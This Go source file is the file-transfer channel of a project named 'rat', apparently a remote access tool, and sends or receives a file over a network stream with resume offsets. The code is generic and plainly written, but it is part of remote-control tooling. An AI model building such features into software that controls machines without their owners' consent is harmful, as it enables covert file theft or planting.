package main

import (
	"encoding/binary"
	"fmt"
	"io"
	"rat/shared"
	"rat/shared/network/header"
)

type ChannelTransfer struct {
	Transfer *Transfer
}

func (ChannelTransfer) Header() header.PacketHeader {
	return header.ChannelTransferHeader
}

func (ch ChannelTransfer) Open(r io.ReadWriteCloser, c *Client) error {
	defer r.Close()

	fp, err := ch.Transfer.Open()

	if err != nil {
		panic(err)
	}

	binary.Write(r, binary.LittleEndian, ch.Transfer.Download)
	binary.Write(r, binary.LittleEndian, ch.Transfer.Offset)
	shared.WriteString(r, ch.Transfer.Remote)

	if ch.Transfer.Offset > 0 {
		_, err = fp.Seek(ch.Transfer.Offset, io.SeekStart)
		if err != nil {
			panic(err)
		}
	}

	if ch.Transfer.Download {
		b := make([]byte, 1024<<3)
		for err == nil {
			var n int
			n, err = r.Read(b)
			fp.Write(b[:n])
			fmt.Println(err)
		}
	} else {
		b := make([]byte, 1024<<3)
		for err == nil {
			var n int
			n, err = fp.Read(b)

			if err == nil {
				r.Write(b[:n])
			}
		}
	}

	fp.Sync()
	fp.Close()

	return nil
}
